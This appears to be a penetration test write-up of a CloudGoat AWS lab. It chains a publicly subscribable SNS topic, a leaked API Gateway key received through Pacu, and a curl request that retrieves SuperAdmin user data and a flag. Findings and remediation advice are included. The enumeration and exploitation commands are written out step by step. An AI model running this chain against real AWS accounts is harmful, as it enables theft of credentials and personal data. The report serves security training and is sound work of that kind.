# AWS SNS Topic Secrets Disclosure & API Gateway Key Exposure — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of a CloudGoat (`sns_secrets` / `iam_privesc_by_key_rotation`) AWS environment, simulating a realistic SNS-based secrets disclosure attack chain. Starting from a low-privilege IAM user with SNS and limited API Gateway read access, the goal was to identify and abuse a publicly subscribable SNS topic to intercept a sensitive API key in transit, then use that key to access a protected API endpoint and retrieve sensitive user data.

## Scope of Work

**In-Scope Assets:**
- **AWS Account:** 390346502168
- **Initial Access:** IAM user `cg-sns-user-cgid7r09976gdu` (provided as starting credentials)
- **Services:** AWS SNS, AWS API Gateway, AWS IAM, AWS STS
- **Testing Perspective:** Low-privilege IAM user with no prior knowledge of the environment

---

## Enumeration

### Initial Identity Verification

```bash
aws sts get-caller-identity --profile cg_sns_secrets
```
```json
{
    "UserId": "AI..C5",
    "Account": "390..68",
    "Arn": "arn:aws:..d7r09976gdu"
}
```

The `cg-sns-user` was confirmed as the starting point.

### IAM Self-Enumeration

No managed policies were attached, but a single inline policy (`cg-sns-user-policy-cgid7r09976gdu`) was present:

```bash
aws iam list-attached-user-policies --user-name cg-sns-user-cgid7r09976gdu --profile cg_sns_secrets
# "AttachedPolicies": []

aws iam list-user-policies --user-name cg-sns-user-cgid7r09976gdu --profile cg_sns_secrets
# "PolicyNames": ["cg-sns-user-policy-cgid7r09976gdu"]
```

The policy document granted:

```json
{
    "Action": [
        "sns:Subscribe", "sns:Receive", "sns:ListSubscriptionsByTopic",
        "sns:ListTopics", "sns:GetTopicAttributes",
        "iam:ListGroupsForUser", "iam:ListUserPolicies", "iam:GetUserPolicy",
        "iam:ListAttachedUserPolicies", "apigateway:GET"
    ],
    "Effect": "Allow",
    "Resource": "*"
}
```

A second statement explicitly **denied** `apigateway:GET` on API key resources, method-level resources, and integration resources — an attempt to prevent the user from reading API Gateway configuration or stored keys directly through the API Gateway control plane:

```json
{
    "Action": "apigateway:GET",
    "Effect": "Deny",
    "Resource": [
        "arn:aws:apigateway:us-east-1::/apikeys",
        "arn:aws:apigateway:us-east-1::/apikeys/*",
        "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
        "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
        "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
        "arn:aws:apigateway:us-east-1::/restapis/*/integration",
        "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration"
    ]
}
```

This deny statement blocks direct enumeration of API keys and method integrations via IAM — but does not address the API key being disclosed through an entirely separate channel (SNS), which is the basis of the first finding below.

### SNS Topic Enumeration

```bash
aws sns list-topics --profile cg_sns_secrets
```
```json
{
    "Topics": [
        {"TopicArn": "arn:aws:sn..7r09976gdu"}
    ]
}
```

The topic's access policy was retrieved via `get-topic-attributes` and revealed a wide-open subscription policy:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": ["sns:Subscribe", "sns:Receive", "sns:ListSubscriptionsByTopic"],
            "Resource": "arn:aws:..ublic-topic-cgid7r09976gdu"
        }
    ]
}
```

`Principal: "*"` meant **any** AWS principal — not just `cg-sns-user` — could subscribe an endpoint (e.g., an email address) to this topic and receive whatever was published to it.

### API Gateway Enumeration

The user's allowed `apigateway:GET` access (outside the deny statement) was used to enumerate the REST API surface:

```bash
aws apigateway get-rest-apis --profile cg_sns_secrets
aws apigateway get-stages --rest-api-id ey90gyffn0 --profile cg_sns_secrets
aws apigateway get-resources --rest-api-id ey90gyffn0 --profile cg_sns_secrets
```

This identified API `cg-api-cgid7r09976gdu` (id `ey90gyffn0`), explicitly tagged and described as demonstrating a "leaked API key scenario," deployed at stage `prod-cgid7r09976gdu`, exposing a `GET /user-data` resource. The resource's method and integration details could not be read directly due to the explicit IAM deny on those actions.

### Tools Used
- AWS CLI
- Pacu (AWS exploitation framework) — used to subscribe to the SNS topic and receive notifications
- `curl`

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| Publicly Subscribable SNS Topic Leaking a Sensitive API Key | Critical | Disclosure of a live API Gateway key to any principal who subscribes |
| Sensitive Data Endpoint Protected Only by a Static API Key | High | Unauthorized retrieval of user PII and credentials via API Gateway |

---

### Publicly Subscribable SNS Topic Leaking a Sensitive API Key

#### Severity
Critical

#### CWE
CWE-668: Exposure of Resource to Wrong Sphere

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The SNS topic `public-topic-cgid7r09976gdu` carried a resource policy granting `sns:Subscribe`, `sns:Receive`, and `sns:ListSubscriptionsByTopic` to `Principal: "*"` — meaning any AWS principal in any account, not just the intended `cg-sns-user`, could subscribe an endpoint to the topic. Despite this exposure, the topic was used to distribute a sensitive value: an active AWS API Gateway key. By subscribing an email endpoint to the topic, a message was received containing this key in plaintext, which provided direct access to a protected API endpoint (see next finding).

#### Affected Functionality
- SNS topic: `arn:aws:sns:us-east-1:390346502168:public-topic-cgid7r09976gdu`

#### Steps to Reproduce
1. Enumerate available SNS topics using the initial low-privilege credentials:
   ```bash
   aws sns list-topics --profile cg_sns_secrets
   ```
2. Retrieve the topic's access policy to confirm subscription is open to any principal:
   ```bash
   aws sns get-topic-attributes \
     --topic-arn arn:aws:sns:us-east-1:390346502168:public-topic-cgid7r09976gdu \
     --profile cg_sns_secrets
   ```
3. Subscribe an attacker-controlled email endpoint to the topic (performed via Pacu):
   ```
   run sns__subscribe  
   ```
4. Confirm and check the subscribed inbox for any messages published to the topic.

#### Proof of Concept
After subscribing to the topic, the following sensitive value was received via the notification channel:
```
DEBUG: API GATEWAY KEY OSz..begh8qGvA5Z9
```
This is a live AWS API Gateway key, disclosed in plaintext to any principal capable of subscribing to the topic — which, per the topic's own access policy, was unrestricted.

#### Impact
- Disclosure of a sensitive API credential to any AWS principal, or potentially any party able to confirm an email subscription, well outside the set of users the application owner likely intended
- Directly enables the subsequent unauthorized access to the protected `/user-data` API endpoint
- Illustrates a broader anti-pattern: using a publicly-subscribable notification channel as an implicit credential-distribution mechanism

#### Root Cause
Two compounding issues: (1) the SNS topic's resource policy granted subscribe/receive permissions to `Principal: "*"` with no restriction (e.g., to specific AWS account IDs or via a condition on `aws:SourceAccount`); (2) the application or process publishing to this topic treated it as a trusted, private channel and sent a sensitive API key to it, when SNS topics with open subscription policies should be treated as public.

#### Recommendation
- Scope SNS topic policies to explicit, named principals (specific IAM users, roles, or AWS account IDs) — never use `Principal: "*"` for topics that carry sensitive content
- Never publish secrets, API keys, or credentials to an SNS topic, regardless of its access policy; use AWS Secrets Manager or SSM Parameter Store for credential distribution instead
- If SNS must be used for operational alerting that includes sensitive debug output, strip sensitive values before publishing, or encrypt the message and restrict decryption to authorized KMS key grantees
- Audit all SNS topic policies in the account for `Principal: "*"` and tighten to least privilege

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-668
- [Amazon SNS Access Control Policies](https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-use-cases.html)

---

### Sensitive Data Endpoint Protected Only by a Static API Key

#### Severity
High

#### CWE
CWE-798: Use of Hard-coded Credentials

#### OWASP Category
OWASP Top 10 2021 – A07: Identification and Authentication Failures

#### Description
The API Gateway REST API `cg-api-cgid7r09976gdu` exposed a `GET /user-data` resource that returned sensitive personal data — including a username, email address, and plaintext password — to any caller presenting a valid `x-api-key` header. No additional authentication or authorization (such as IAM-based SigV4 auth, a Cognito authorizer, or OAuth) was enforced on the endpoint. Once the API key was obtained via the SNS disclosure above, the endpoint was freely accessible.

#### Affected Functionality
- API Gateway REST API: `cg-api-cgid7r09976gdu` (id `ey90gyffn0`)
- Stage: `prod-cgid7r09976gdu`
- Resource: `GET /user-data`

#### Steps to Reproduce
1. Obtain a valid API key (see previous finding).
2. Send a GET request to the `/user-data` resource with the key in the `x-api-key` header:
   ```bash
   curl -X GET 'https://ey90gyffn0.execute-api.us-east-1.amazonaws.com/prod-cgid7r09976gdu/user-data' \
     -H 'x-api-key: OSzkSLqI5T..dz3xdbegh8qGvA5Z9'
   ```

#### Proof of Concept
The request returned sensitive user data and a flag value in plaintext, with no further authentication required:
```json
{
    "final_flag": "FLAG{SNS_S3cr3ts_ar3_FUN}",
    "message": "Access granted",
    "user_data": {
        "email": "SuperAdmin@notarealemail.com",
        "password": "p@ssw0rd123",
        "user_id": "1337",
        "username": "SuperAdmin"
    }
}
```

#### Impact
- Full disclosure of sensitive user data, including a plaintext password, to anyone holding the API key
- API Gateway API keys are static, long-lived, and intended primarily for usage-plan throttling/metering rather than as an authentication/authorization control — relying on them as the sole gate for sensitive data is a fundamentally weak access control
- Combined with the previous finding, this completes a full chain from a low-privilege IAM identity to disclosure of "SuperAdmin" credentials and PII

#### Root Cause
The API method relied solely on an API key for access control rather than a proper identity-aware authorizer. API Gateway API keys are not designed as a security boundary — they are not scoped to individual users, cannot carry fine-grained permissions, and are easily leaked (as demonstrated here) since they are simple static strings passed in a header.

#### Recommendation
- Do not rely on API Gateway API keys as the sole access control mechanism for endpoints returning sensitive data; use IAM authorization, a Lambda authorizer, or an Amazon Cognito authorizer to enforce real identity-based access control
- If API keys must be used (e.g., for usage-plan throttling), pair them with a proper authorizer rather than treating key possession as proof of authorization
- Avoid returning plaintext passwords or other sensitive credential material in API responses under any circumstance; passwords should never be stored or transmitted in plaintext
- Rotate the exposed API key immediately and audit CloudTrail/API Gateway access logs for any prior unauthorized use
- Apply usage plans with strict throttling and request quotas, and enable API Gateway access logging with alerting on anomalous key usage

#### References
- OWASP Top 10 2021 – A07: Identification and Authentication Failures
- CWE-798
- [Control access to a REST API using API Gateway resource policies and authorizers](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html)

---

## Attack Chain Summary

1. Started with low-privilege IAM user `cg-sns-user`, scoped to SNS subscription/receive and limited API Gateway read access (provided as initial access)
2. Enumerated the user's inline IAM policy, confirming SNS permissions and an explicit deny on reading API Gateway keys, methods, and integrations directly
3. Enumerated SNS topics and discovered `public-topic-cgid7r09976gdu`, whose access policy granted `Subscribe`/`Receive` to `Principal: "*"`
4. Enumerated the API Gateway REST API and confirmed a `GET /user-data` resource existed, tagged as part of a "leaked API key scenario," though its method/integration details were blocked by IAM deny
5. Used Pacu to subscribe an endpoint to the public SNS topic and received a published message containing a live API Gateway key
6. Used the leaked API key to call the `/user-data` endpoint directly via `curl`, with no further authentication required
7. Retrieved sensitive user data (username, email, plaintext password) and the target flag, completing the attack chain

## Key Takeaways

- SNS topics with `Principal: "*"` in their access policy are effectively public — anyone able to subscribe can receive every message published to that topic, including operational or debug content never intended for public consumption
- Denying direct IAM read access to API Gateway keys does not protect those keys if they are disclosed through an entirely separate, less-guarded channel (here, SNS) — security controls must account for all paths a secret can travel, not just the most obvious one
- API Gateway API keys are a metering/throttling mechanism, not an authentication mechanism, and should never be the sole control protecting sensitive data
- Returning plaintext passwords in any API response is a critical anti-pattern regardless of the access control in front of it
- This chain demonstrates that secrets disclosure doesn't always require traditional credential theft (Lambda env vars, S3 objects, IMDS) — messaging and notification services like SNS, SQS, and EventBridge are equally viable (and often overlooked) exfiltration paths when their access policies are too permissive

---

## Cleanup / Teardown

To avoid ongoing AWS charges and to leave the environment in a clean state after testing:

1. **Unsubscribe any test endpoints** added to the SNS topic during testing:
   ```bash
   aws sns unsubscribe --subscription-arn <subscription-arn> --profile cg_sns_secrets
   ```
2. **Rotate or delete the disclosed API Gateway key** if this were a real environment, to invalidate any further use:
   ```bash
   aws apigateway delete-api-key --api-key <api-key-id> --profile cg_sns_secrets
   ```
3. **Destroy the CloudGoat scenario** to tear down all provisioned infrastructure (SNS topic, API Gateway, IAM user/policy) and avoid continued billing:
   ```bash
   cloudgoat destroy sns_secrets
   ```
4. Confirm in the AWS Console (SNS, API Gateway, IAM) that no residual topics, subscriptions, APIs, keys, or users from the scenario remain.